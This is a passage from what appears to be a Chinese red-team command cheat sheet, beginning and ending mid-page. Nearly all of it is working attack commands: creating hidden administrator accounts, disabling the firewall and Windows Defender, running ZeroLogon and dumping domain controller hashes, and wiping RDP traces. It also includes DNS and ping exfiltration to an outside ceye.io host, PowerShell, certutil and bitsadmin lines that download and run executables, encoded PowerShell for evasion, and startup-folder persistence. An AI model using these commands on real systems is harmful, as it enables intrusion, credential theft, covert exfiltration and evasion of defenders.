useradd newuwer;echo -e &#34;123456\n123456\n&#34; |passwd newuser</code></pre><h3 id="windowshttpsbookshentoushitopmanualredteam_commandhtmlwindows" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#windows"target="_blank" rel="external nofollow noopener noreferrer">windows</a></span>
  <a href="#windowshttpsbookshentoushitopmanualredteam_commandhtmlwindows" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><pre tabindex="0"><code>net user admin$ Afabab@20 /add
net localgroup administrators admin$ /add

net user guest /active:yes
net localgroup administrators guest /add

Net localgroup Administrators kent /add /domain 将域用户添加到域管理员组

Net localgroup Administrators /add test\kent 将域用户添加到本地管理员组</code></pre><h2 id="防火墙httpsbookshentoushitopmanualredteam_commandhtml防火墙" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e9%98%b2%e7%81%ab%e5%a2%99"target="_blank" rel="external nofollow noopener noreferrer">防火墙</a></span>
  <a href="#%e9%98%b2%e7%81%ab%e5%a2%99httpsbookshentoushitopmanualredteam_commandhtml%e9%98%b2%e7%81%ab%e5%a2%99" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>关闭防火墙

netsh firewall set opmode mode=disable

放行远程8888端口进来的流量
netsh advfirewall firewall add rule name=&#34;88&#34; protocol=TCP dir=in remoteport=8888 action=allow

放行出去到远程8888端口的流量
netsh advfirewall firewall add rule name=&#34;88&#34; protocol=TCP dir=out remoteport=8888 action=allow

放行本地4444端口出去的流量
netsh advfirewall firewall add rule name=&#34;44&#34; protocol=TCP dir=out localport=4444 action=allow

放行从本地4444端口进来的流量
netsh advfirewall firewall add rule name=&#34;44&#34; protocol=TCP dir=in localport=4444 action=allow

删除规则
netsh advfirewall firewall delete rule name=&#34;88&#34;

查看防火墙配置(可看到具体规则等配置)
netsh firewall show config

关闭windefebd
net stop windefend

netsh firewall set portopening TCP 445 ENABLE //打开445端口    
netsh firewall set portopening TCP 3389 ENABLE //开放终端  
netsh firewall delete allowedprogram C:/A.exe //删除放行程序A.exe   
netsh firewall set allowedprogram C:/A.exe test ENABLE //添加程序C盘下的A.exe并放行   
netsh firewall add allowedprogram C:/A.exe test ENABLE //添加程序C盘下的A.exe并放行   

新版本命令   

netsh advfirewall firewall add rule name=&#34;test&#34; dir=in action=allow program=&#34;C:\windows\temp\update.exe&#34; enable=yes   
netsh advfirewall firewall add rule name=&#34;test&#34; dir=out action=allow program=&#34;C:\windows\temp\update.exe&#34; enable=yes   </code></pre><p>iptables 放行</p>
<pre tabindex="0"><code>iptables -A INPUT -p tcp --dport 80 -j ACCEPT</code></pre><h2 id="frp常用配置httpsbookshentoushitopmanualredteam_commandhtmlfrp常用配置" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#frp%e5%b8%b8%e7%94%a8%e9%85%8d%e7%bd%ae"target="_blank" rel="external nofollow noopener noreferrer">frp常用配置</a></span>
  <a href="#frp%e5%b8%b8%e7%94%a8%e9%85%8d%e7%bd%aehttpsbookshentoushitopmanualredteam_commandhtmlfrp%e5%b8%b8%e7%94%a8%e9%85%8d%e7%bd%ae" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>frpc.ini</p>
<pre tabindex="0"><code>[common]
server_addr = xxxxxx
server_port = 7000

[rdp]
type = tcp
local_port = 3389
remote_port = 3389

[plugin_http_proxy]
type = tcp
remote_port = 10801
plugin = http_proxy

[plugin_socks5]
type = tcp
remote_port = 1080
plugin = socks5</code></pre><h2 id="zerologonhttpsbookshentoushitopmanualredteam_commandhtmlzerologon" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#zerologon"target="_blank" rel="external nofollow noopener noreferrer">ZeroLogon</a></span>
  <a href="#zerologonhttpsbookshentoushitopmanualredteam_commandhtmlzerologon" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>产生日志 4742(利用成功), 5580(利用失败)</li>
<li>流量特征明显</li>
<li>会被av直接秒</li>
<li>有可能会导致目标脱域</li>
<li>代理不稳，容易出问题</li>
</ul>
<pre tabindex="0"><code> git clone https://github.com/mstxq17/cve-2020-1472.git
 
 python3 zerologon_tester.py Dc02 172.23.119.120 域外检测
 
 PingCastle.exe --server 172.23.119.120 --scanner zerologon --scmode-dc 域内检测
 </code></pre><p>洞清空目标域控机器账户密码</p>
<pre tabindex="0"><code>python3 cve-2020-1472-exploit.py Dc02$ 172.23.119.120</code></pre><p>无密码远程提取 ntds.dit</p>
<pre tabindex="0"><code>python3 secretsdump.py qq.local/&#39;Dc02$&#39;@172.23.119.120 -no-pass -outputfile qq.local.ntds.hash</code></pre><p>用 administrator 域管账户 hash 远程导出域控机器账户 hash [hex 格式]</p>
<pre tabindex="0"><code>python3 secretsdump.py -hashes :ccef208c6485269c20db2cad21734fe7 qq/administrator@172.23.119.120</code></pre><p>用上面的 hex 还原目标域控机器账户密码</p>
<pre tabindex="0"><code>python3 restorepassword.py Dc02@Dc02 -target-ip 172.23.119.120 -hexpass daf1d2acc25d2e54218921737a40d58192b9bcdf089ddbeaf9f7931571b07916f96e2c51d8d00f56d2440c13c0e5586e2dafd1669e37131***</code></pre><h2 id="删rdp日志httpsbookshentoushitopmanualredteam_commandhtml删rdp日志" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e5%88%a0rdp%e6%97%a5%e5%bf%97"target="_blank" rel="external nofollow noopener noreferrer">删rdp日志</a></span>
  <a href="#%e5%88%a0rdp%e6%97%a5%e5%bf%97httpsbookshentoushitopmanualredteam_commandhtml%e5%88%a0rdp%e6%97%a5%e5%bf%97" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>清除远程桌面连接记录,创建clear.bat</p>
<pre tabindex="0"><code>@echo off
reg delete &#34;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&#34; /va /f
reg delete &#34;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&#34; /f
reg add &#34;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&#34;
cd %userprofile%\documents\attrib Default.rdp -s -h
del Default.rdp</code></pre><h2 id="开3389httpsbookshentoushitopmanualredteam_commandhtml开3389" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e5%bc%803389"target="_blank" rel="external nofollow noopener noreferrer">开3389</a></span>
  <a href="#%e5%bc%803389httpsbookshentoushitopmanualredteam_commandhtml%e5%bc%803389" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>方法一
wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != &#34;&#34;) call setallowtsconnections 1
wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1
reg add &#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&#34; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
net start TermService

方法二
#设置远程桌面端口
reg add &#34;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34; /t REG_DWORD /v portnumber /d 3389 /f
#开启远程桌面
wmic RDTOGGLE WHERE ServerName=&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1
#检查端口状态
netstat -an|find &#34;3389&#34;
#关闭远程桌面
wmic RDTOGGLE WHERE ServerName=&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 0</code></pre><h2 id="文件搜索httpsbookshentoushitopmanualredteam_commandhtml文件搜索" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e6%96%87%e4%bb%b6%e6%90%9c%e7%b4%a2"target="_blank" rel="external nofollow noopener noreferrer">文件搜索</a></span>
  <a href="#%e6%96%87%e4%bb%b6%e6%90%9c%e7%b4%a2httpsbookshentoushitopmanualredteam_commandhtml%e6%96%87%e4%bb%b6%e6%90%9c%e7%b4%a2" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><a href="https://www.anquanke.com/post/id/245019"target="_blank" rel="external nofollow noopener noreferrer">https://www.anquanke.com/post/id/245019</a></p>
<pre tabindex="0"><code>findstr /s /i /n /d:C:\ /c:&#34;123123&#34; *.txt
for /r C: %i in (login.*) do @echo %i
where /R C: login.*
dir /s/a-d/b login.*
find / -name index.php
find / -name index.php
find / -name &#34;index.php&#34; | xargs grep &#34;111222&#34;
updatedb &amp;&amp; locate index.php
进程路径
wmic process get name,executablepath</code></pre><h3 id="外带oobhttpsbookshentoushitopmanualredteam_commandhtml外带oob" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e5%a4%96%e5%b8%a6oob"target="_blank" rel="external nofollow noopener noreferrer">外带oob</a></span>
  <a href="#%e5%a4%96%e5%b8%a6oobhttpsbookshentoushitopmanualredteam_commandhtml%e5%a4%96%e5%b8%a6oob" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>Windows 在windows当中，%cd% 代表的是当前目录，我们通过echo将当前目录写入文本temp,然后荣国certutil对文件内容进行base64编码，再过滤certutil携带的字符，将它赋给一个变量，最后通过nslookup外带出来，从而实现获取当前目录的目的。</p>
<pre tabindex="0"><code>echo %cd% &gt; temp&amp;&amp;certutil -encode temp temp1&amp;&amp;findstr /L /V &#34;CERTIFICATE&#34; temp1 &gt; temp2&amp;&amp;set /p ADDR=&lt;temp2&amp;&amp;nslookup %ADDR%.is1lv6.ceye.io</code></pre><p>下面这个语句，主要是过滤作用。把helo.txt文件中的“=”过滤并重新输出文件。</p>
<pre tabindex="0"><code>for /f &#34;delims=^= tokens=1,*&#34; %i in (helo.txt) do (echo %i&gt;&gt;text3.txt)</code></pre><p>为什么在上面需要过滤=，主要是因为在执行ping命令的时候是不允许带=号的，相较于nslookup，ping命令成功率相对较高，但如果路径过长，可能会导致失败。具体多长需要大家自行试验。</p>
<pre tabindex="0"><code>echo %cd% &gt; temp&amp;&amp;certutil -encode temp temp1&amp;&amp;findstr /L /V &#34;CERTIFICATE&#34; temp1 &gt; temp2&amp;&amp;for /f &#34;delims=^= tokens=1,*&#34; %i in (temp2) do (echo %i&gt;&gt;temp3)&amp;&amp;set /p ADDR=&lt;temp3&amp;ping %ADDR%.is1lv6.ceye.io</code></pre><p>如果需要外带多行命令，则需要以下语句：</p>
<pre tabindex="0"><code>where /R C: login.* &gt; test &amp;&amp; certutil -encodehex -f test test.hex 4 &amp;&amp; powershell $text=Get-Content test.hex;$sub=$text -replace(&#39; &#39;,&#39;&#39;);$j=11111;foreach($i in $sub){ $fin=$j.tostring()+&#39;.&#39;+$i+&#39;.is1lv6.ceye.io&#39;;$j += 1; nslookup $fin }
（b）Linux</code></pre><p>在linux中pwd也是查看当前目录的，我们通过tr -d将换行符去掉并通过xxd -ps将值转化为16进制，这样我们即可外带出自己想要的东西。</p>
<pre tabindex="0"><code>ping pwd|tr -d &#39;\n&#39;|xxd -ps.is1lv6.ceye.io</code></pre><p>base64原理和上面类似，主要是对值进行base64编码，然后替换掉“=”，即可成功外带数据。</p>
<pre tabindex="0"><code>pingpwd|base64|tr -d ‘=’.is1lv6.ceye.io</code></pre><p>如果有多行数据需要外带，那么请考虑下面的语句。</p>
<pre tabindex="0"><code>var=11111 &amp;&amp; for b in $(find / -name &#34;index.php&#34; | xargs grep &#34;111222&#34;|xxd -p); do var=$((var+1)) &amp;&amp; dig $var.$b.is1lv6.ceye.io; done</code></pre><h2 id="powershell文件下载httpsbookshentoushitopmanualredteam_commandhtmlpowershell文件下载" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#powershell%e6%96%87%e4%bb%b6%e4%b8%8b%e8%bd%bd"target="_blank" rel="external nofollow noopener noreferrer">powershell文件下载</a></span>
  <a href="#powershell%e6%96%87%e4%bb%b6%e4%b8%8b%e8%bd%bdhttpsbookshentoushitopmanualredteam_commandhtmlpowershell%e6%96%87%e4%bb%b6%e4%b8%8b%e8%bd%bd" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>powershell (new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.1.1/1.exe&#39;,&#39;C:\test\1.exe&#39;);start-process &#39;C:\test\1.exe&#39;
powershell (new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.1.1/1.exe&#39;,&#39;1.exe&#39;)
Invoke-Expression (New-Object Net.WebClient).DownloadString(&#34;http://xxx.xx.xx.xx/test.ps1&#34;)</code></pre><p>bypass</p>
<pre tabindex="0"><code>echo (new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.31.93:8000/tomcat.exe&#39;,&#39;C:/Users/test/cc.exe&#39;)| powershell -</code></pre><p>base64编码(和其他base64不同，解不开)</p>
<pre tabindex="0"><code>$Text = &#34;(new-object System.Net.WebClient).DownloadFile(&#39;http://xxxxxxxxxx:8000/bddch.txt&#39;,&#39;bdchd.txt&#39;)&#34;
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText</code></pre><p>解码</p>
<pre tabindex="0"><code>$EncodedText = &#34;dwByAGkAxxxxxxxxxxxxxxxxxxxAG0AbgB0AG4AJwA=&#34;
$DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
$DecodedText</code></pre><p>运行base64编码的命令</p>
<pre tabindex="0"><code>powershell -noP -sta -enc xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code></pre><h2 id="certutilexe下载httpsbookshentoushitopmanualredteam_commandhtmlcertutilexe下载" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#certutilexe%e4%b8%8b%e8%bd%bd"target="_blank" rel="external nofollow noopener noreferrer">certutil.exe下载</a></span>
  <a href="#certutilexe%e4%b8%8b%e8%bd%bdhttpsbookshentoushitopmanualredteam_commandhtmlcertutilexe%e4%b8%8b%e8%bd%bd" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>certutil.exe -urlcache -split -f http://192.168.1.1/1.exe
certutil.exe -urlcache -split -f http://192.168.1.1/1.txt 1.exe
certutil.exe -urlcache -split -f http://192.168.6.27:8012/download/f.ext C:\windows\temp\up.exe &amp;&amp;start C:\windows\temp\up.exe</code></pre><p>删除缓存</p>
<pre tabindex="0"><code>certutil.exe -urlcache -split -f http://192.168.1.1/1.exe delete</code></pre><p>查看缓存项目：</p>
<pre tabindex="0"><code>certutil.exe -urlcache *</code></pre><p>转为base64</p>
<pre tabindex="0"><code>certutil -encode lcx64.exe lcx64.txt</code></pre><p>转回来</p>
<pre tabindex="0"><code>certutil -decode lcx64.txt lcx64.exe</code></pre><p>查看md5</p>
<pre tabindex="0"><code>certutil -hashfile a.exe MD5</code></pre><p>bypass</p>
<pre tabindex="0"><code>Certutil &amp; Certutil –urlcache –f –split url
Certutil | Certutil –urlcache –f –split url</code></pre><h2 id="bitsadminhttpsbookshentoushitopmanualredteam_commandhtmlbitsadmin" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#bitsadmin"target="_blank" rel="external nofollow noopener noreferrer">bitsadmin</a></span>
  <a href="#bitsadminhttpsbookshentoushitopmanualredteam_commandhtmlbitsadmin" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><strong>不支持https、ftp协议，php python带的服务器会出错</strong></p>
<pre tabindex="0"><code>bitsadmin /transfer n http://192.168.1.1/1.exe  C:\test\update\1.exe</code></pre><h2 id="windows权限维持httpsbookshentoushitopmanualredteam_commandhtmlwindows权限维持" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#windows%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81"target="_blank" rel="external nofollow noopener noreferrer">windows权限维持</a></span>
  <a href="#windows%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81httpsbookshentoushitopmanualredteam_commandhtmlwindows%e6%9d%83%e9%99%90%e7%bb%b4%e6%8c%81" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 id="startup目录httpsbookshentoushitopmanualredteam_commandhtmlstartup目录" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#startup%e7%9b%ae%e5%bd%95"target="_blank" rel="external nofollow noopener noreferrer">Startup目录</a></span>
  <a href="#startup%e7%9b%ae%e5%bd%95httpsbookshentoushitopmanualredteam_commandhtmlstartup%e7%9b%ae%e5%bd%95" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><pre tabindex="0"><code>NT6以后的目录如下：

对当前用户有效：
C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
对所有用户有效：
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
NT6以前的目录如下：

对当前用户有效：
C:\Documents and Settings\Hunter\「开始」菜单\程序\启动
对所有用户有效：
C:\Documents and Settings\All Users\「开始」菜单\程序\启动</code></pre><h3 id="注册键httpsbookshentoushitopmanualredteam_commandhtml注册键" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e6%b3%a8%e5%86%8c%e9%94%ae"target="_blank" rel="external nofollow noopener noreferrer">注册键</a></span>
  <a href="#%e6%b3%a8%e5%86%8c%e9%94%aehttpsbookshentoushitopmanualredteam_commandhtml%e6%b3%a8%e5%86%8c%e9%94%ae" class="heading-mark">
